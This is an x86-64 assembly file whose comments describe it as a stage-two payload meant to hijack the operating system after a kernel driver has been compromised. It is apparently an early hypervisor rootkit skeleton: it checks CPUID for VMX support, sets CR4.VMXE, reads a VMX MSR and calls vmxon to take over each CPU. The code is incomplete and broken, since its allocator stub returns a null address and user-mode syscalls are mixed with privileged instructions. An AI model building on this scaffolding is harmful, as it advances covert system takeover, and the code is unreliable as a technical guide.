# ------------------------------------------------------------------------------
# Position Independent Code. This code should, hopefully, hijack the system/os
# from any position in memory. This code blob can be streamed in by any kernel
# level code, so this code should be stage 2 after hijacking a kernel driver or
# something to that effect.
# ------------------------------------------------------------------------------



# ------------------------------------------------------------------------------
# Utility Code. Platform Dependent.
# ------------------------------------------------------------------------------

write:
    # Get String Length.
    movq $0, %rcx
    movq %rdi, %r10
    decq %r10
    _linux_write_count:
    incq %rcx
    incq %r10
    cmpb $0, (%r10)
    jne _linux_write_count

    movq $1, %rax
    movq %rcx, %rdx
    movq %rdi, %rsi
    movq $1, %rdi
    syscall
    retq

quit:
    movq $60, %rax
    movq $0, %rdi
    syscall
    retq



# ------------------------------------------------------------------------------
# Code for doing CPUID detection. This makes sure the CPU is a brand we can
# actually hijack, and if it is, it checks the feature set to make sure
# virtualization features are actually present.
# ------------------------------------------------------------------------------

cpuid_detect:
    # Call Initial CPUID.
    movq $0, %rax
    cpuid
    movl %eax, _leaf(%rip)

    # Extract CPU Name.
    movq $0, %rax
    movl %ebx, _cpu0(%rip)
    movl %edx, _cpu1(%rip)
    movl %ecx, _cpu2(%rip)

    # Extract CPU Feature Set.
    movq $1, %rax
    cpuid
    movl %ecx, _features(%rip)
    retq


cpuid_check:
    # Track Indexes into Strings.
    leaq _cpu0(%rip), %rcx
    leaq _cpus(%rip), %rdx
    decq %rdx

    # Loop Through Results.
    _cpuid_continue:
    incq %rdx
    cmpb $0, (%rdx)
    jz _cpuid_fail

    movb (%rcx), %al
    cmpb %al, (%rdx)
    jnz _cpuid_continue

    incq %rcx
    cmpb $0, (%rcx)
    jnz _cpuid_continue

    _cpuid_success:
    testq $32, _features(%rip)
    jz _cpuid_fail
    movq $1, %rax
    retq

    _cpuid_fail:
    movq $0, %rax
    retq

# CPUID States.
_leaf:              .byte 0, 0, 0, 0
_cpu0:              .byte 0, 0, 0, 0
_cpu1:              .byte 0, 0, 0, 0
_cpu2:              .byte 0, 0, 0, 0
_family:            .byte 0
_features:          .byte 0, 0, 0, 0
_cpus:              .string "AuthenticAMDGenuineIntel"
                    .byte 0



# ------------------------------------------------------------------------------
# CPU subvertion routines. This prepares VM execution on each core.
# ------------------------------------------------------------------------------

subvert_cpu:
    call enable_vmxe
    call detect_vmxe
    call create_vmcs
    retq


enable_vmxe:
    movq %cr4, %rax
    orq $8192, %rax
    movq %rax, %cr4
    retq


detect_vmxe:
    movq $0x480, %rcx
    rdmsr
    movq %rdx, _vmxe_identifier(%rip)
    retq


kalloc_vmxr:
    movq $0, %rax
    retq


create_vmcs:
    callq kalloc_vmxr
    movq %rax, _vmxe_vmxon_addr(%rip)
    vmxon _vmxe_vmxon_addr(%rip)
    retq

_vmxe_identifier: .byte 0, 0, 0, 0
_vmxe_vmxon_addr: .byte 0, 0, 0, 0, 0, 0, 0, 0



# ------------------------------------------------------------------------------
# Main Entry Point.
# ------------------------------------------------------------------------------

.globl _init
_init:
    # Collect CPUID details.
    callq cpuid_detect

    # Check CPUID details.
    callq cpuid_check
    cmpq $0, %rax
    jz _init_fail

    # Capture CPUs.
    callq subvert_cpu
    callq quit

    # If we failed, we quit.
    _init_fail:
    callq quit
